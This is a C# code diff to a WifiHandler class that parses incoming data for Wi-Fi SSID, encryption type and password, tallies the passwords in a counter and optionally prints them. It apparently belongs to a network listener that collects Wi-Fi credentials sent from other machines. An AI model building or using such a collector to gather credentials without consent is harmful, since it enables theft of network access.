@@ -1,14 +1,15 @@
 ﻿using System;
 using System.Threading;
-using PS03.Network.Receive.PostOp;
+using PS03.PostOp;
 
 namespace PS03.Network.Receive.Handlers
 {
     public class WifiHandler
     {
         private bool first = true;
+        public bool Printing = true;
         private readonly Mutex mtx = new Mutex();
-        private readonly PasswordCounter pwc = PasswordCounter.Instance;
+        private readonly DataCounter pwc = DataCounter.Instance;
 
         public void Handle(string data)
         {
@@ -23,8 +24,9 @@ namespace PS03.Network.Receive.Handlers
             var SSID = data.Substring(ssiMark, encMark - ssiMark);
             var Encryption = data.Substring(encMark + ("ENC=").Length, pasMark - (encMark + ("ENC=").Length));
             var Password = data.Substring(pasMark + ("PASS=").Length, data.Length - (pasMark + ("PASS=").Length));
-            pwc.Add(Password);
-            Print(SSID, Encryption, Password);
+            pwc.AddPassword(Password);
+            if(Printing)
+                Print(SSID, Encryption, Password);
         }
 
         private void Print(string ssid, string enc, string pass)
